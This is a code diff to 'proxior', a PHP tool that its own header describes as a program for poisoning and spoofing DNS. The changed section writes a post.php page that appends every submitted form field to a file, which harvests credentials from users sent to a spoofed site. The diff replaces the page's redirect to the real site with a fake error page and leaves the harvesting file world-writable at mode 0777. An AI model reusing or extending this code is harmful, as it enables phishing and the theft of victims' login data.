@@ -1,5 +1,10 @@
 <?php
 
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+
 /*
 *  Copyright (c) 2019 Barchampas Gerasimos <makindosx@gmail.com>.
 *  proxior is a program for poisoning and spoofing dns.
@@ -345,10 +350,17 @@ usleep(3000000);
       .'file_put_contents($file, print_r($_POST, true), FILE_APPEND);' .PHP_EOL
       .'?>'
       .PHP_EOL
-      ."<meta http-equiv='refresh' content='0; url=$site_hack'/>";
+      .'<html>
+      <head>
+      </head>
+      <body style="background-image:url(css/error.png); background-repeat: no-repeat; background-size: auto; background-position:center; background-color: #f7f7f7;">
+      </body>
+      </html>';
+
     fwrite($post_file_php, $lines_php);
     fclose($post_file_php);
 
+      #."<meta http-equiv='refresh' content='0; url=$site_hack'/>";
 
       chmod("/var/www/proxior/post.php", 0777);
 
